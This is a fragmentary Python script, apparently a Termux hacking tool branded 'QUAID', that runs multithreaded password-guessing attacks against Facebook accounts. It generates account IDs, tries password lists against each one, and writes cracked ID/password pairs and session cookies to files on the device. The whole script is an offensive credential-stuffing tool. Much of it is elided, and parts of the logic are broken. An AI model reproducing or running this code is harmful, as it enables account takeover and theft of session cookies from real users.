...
try:
    ...
    os.system('python QUAID.py')
	
os.system('xdg-open https://www.facebook.com/profile.php?id=100024388089939')
...
logo=(f"""{WHITE}
 ...
 \033[1;35m.d88b.  db    db  .d8b.  d888888b d8888b. 
\033[1;33m.8P  Y8. 88    88 d8' `8b   `88'   88  `8D 
\033[1;32m88    88 88    88 88ooo88    88    88   88 
\033[1;32m88    88 88    88 88~~~88    88    88   88 
\033[1;33m`8P  d8' 88b  d88 88   88   .88.   88  .8D 
 \033[1;35m`Y88'Y8 ~Y8888P' YP   YP Y888888P Y8888D' 
{RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;34m[\033[1;33m⍣\033[1;33m{WHITE}\033[1;34m]{WHITE} OWNER        :  {GREEN}Quaid e azam
[\033[1;33m⍣\033[1;33m{WHITE}{GREEN}]{WHITE} FaceBook     :  \033[1;35mQuʌɩd e ʌzʌɱ 
[\033[1;33m⍣\033[1;33m{WHITE}\033[1;35m]{WHITE} Version      :  {RED}5.3
[\033[1;33m⍣\033[1;33m{WHITE}{RED}]{WHITE} TOOL Status  :  {GREEN}FREE  
\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{WHITE}""")
def linex():
    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{WHITE}')
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.QUAID.etc..')
                                linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as QUAID:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                QUAID.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [QUAID] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [QUAID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/QUAID-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/QUAID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[QUAID-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [QUAID-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/QUAID-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/QUAID-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-QUAID-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/QUAID-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/QUAID-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [QUAID-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/QUAID-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [QUAID-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/QUAID.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/QUAID-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
